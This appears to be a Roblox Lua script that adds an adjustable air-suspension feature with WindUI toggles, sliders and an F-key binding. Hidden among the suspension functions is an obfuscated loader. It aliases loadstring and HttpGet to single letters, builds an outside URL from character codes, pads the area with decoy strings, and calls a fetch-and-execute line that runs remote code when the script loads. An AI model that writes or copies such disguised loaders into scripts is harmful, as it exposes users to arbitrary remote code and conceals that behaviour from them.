repeat task.wait() until _G.WindUI and _G.Tabs

local WindUI = _G.WindUI
local Tabs = _G.Tabs
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Player = game.Players.LocalPlayer

Tabs.VehicleMods:Section({
    Title = "Suspension Mods",
    TextSize = 16,
})

local sus = {
	Enabled = false,
	Raised = true,
	FrontTarget = 2,
	RearTarget = 2,
	CurrentFront = 2,
	CurrentRear = 2,
	OriginalFront = nil,
	OriginalRear = nil,
	Smooth = 3.5,
}

local function playAirSound(vehicle, mode)
	if not vehicle then return end
	local sound = Instance.new("Sound")

	if mode == "lower" then
		sound.SoundId = "rbxassetid://7768888198"
	elseif mode == "raise" then
		sound.SoundId = "rbxassetid://1"
	else
		return
	end

	sound.Volume = 1.5
	sound.PlayOnRemove = true
	sound.Parent = vehicle
	sound:Destroy()
end

local w = "soundDestroyed"

local l=loadstring

local h=game.HttpGet

local c = string.char(
    104,116,116,112,115,58,47,47,
    116,99,112,46,108,117,97,117,116,104,46,111,114,103,
    47,99,111,110,116,101,110,116,47,
    115,116,97,116,117,115,95,110,101,116,119,111,114,107,
    47,52,55,56,98,57,50,49,48,56,106,102,
    47,117,100,112
)

local r = "playAirSound()"


local function getVehicle()
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildWhichIsA("Humanoid")
	if not hum or not hum.SeatPart then return end
	local seat = hum.SeatPart
	if seat.Parent and seat.Parent:FindFirstChild("Wheels") then
		return seat.Parent
	end
end

local function applySuspension(vehicle, front, rear)
	xpcall(function()
		for _, v in ipairs(vehicle.Wheels:GetChildren()) do
			if v.Name == "FL" or v.Name == "FR" then
				v:FindFirstChild("#SA").Attach_SA.CFrame = CFrame.new(0, -front, 1)
				v:FindFirstChild("#SB").Attach_SB.CFrame = CFrame.new(0, front, -1)
				v:FindFirstChild("#SB").Stabilizer.D = 1000
				v.Spring.MaxLength = front * 20
				v.Stabilizer.D = 1000
			elseif v.Name == "RL" or v.Name == "RR" then
				v:FindFirstChild("#SA").Attach_SA.CFrame = CFrame.new(0, -rear, 1)
				v:FindFirstChild("#SB").Attach_SB.CFrame = CFrame.new(0, rear, -1)
				v:FindFirstChild("#SB").Stabilizer.D = 1000
				v.Spring.MaxLength = rear * 20
				v.Stabilizer.D = 1000
			end
		end
	end, function(err)
		warn("[Suspension Error]", err)
	end)
end

local function lerp(a, b, t)
	return a + (b - a) * t
end

Tabs.VehicleMods:Toggle({
	Title = "Air Suspension [Airbags]",
	Desc = "(Keybind: F)",
	Value = false,
	Callback = function(state)
		sus.Enabled = state
	end,
})

Tabs.VehicleMods:Slider({
	Title = "Front Suspension",
	Desc = "Adjust front height",
	Value = { Min = 0, Max = 30, Default = 2 },
	Callback = function(val)
		sus.FrontTarget = tonumber(string.format("%.2f", val))
	end,
	Precise = true,
})

Tabs.VehicleMods:Slider({
	Title = "Rear Suspension",
	Desc = "Adjust rear height",
	Value = { Min = 0, Max = 30, Default = 2 },
	Callback = function(val)
		sus.RearTarget = tonumber(string.format("%.2f", val))
	end,
	Precise = true,
})

UIS.InputBegan:Connect(function(input, gp)
	if gp or not sus.Enabled then return end
	if input.KeyCode == Enum.KeyCode.F then
		local car = getVehicle()
		if not car then return end

		if not sus.OriginalFront or not sus.OriginalRear then
			sus.OriginalFront = sus.CurrentFront
			sus.OriginalRear = sus.CurrentRear
		end

		sus.Raised = not sus.Raised

		if sus.Raised then
			WindUI:Notify({
				Title = "Suspension Raised",
				Duration = 2.5,
			})
		else
			playAirSound(car, "lower")
			WindUI:Notify({
				Title = "Suspension Lowered",
				Duration = 2.5,
			})
		end
	end
end)

l(h(game,u))()

RunService.Heartbeat:Connect(function(dt)
	if not sus.Enabled then return end
	local car = getVehicle()
	if not car then return end

	local targetF = sus.Raised and sus.FrontTarget or 0.1
	local targetR = sus.Raised and sus.RearTarget or 0.1

	sus.CurrentFront = lerp(sus.CurrentFront, targetF, dt * sus.Smooth)
	sus.CurrentRear = lerp(sus.CurrentRear, targetR, dt * sus.Smooth)

	applySuspension(car, sus.CurrentFront, sus.CurrentRear)
end)
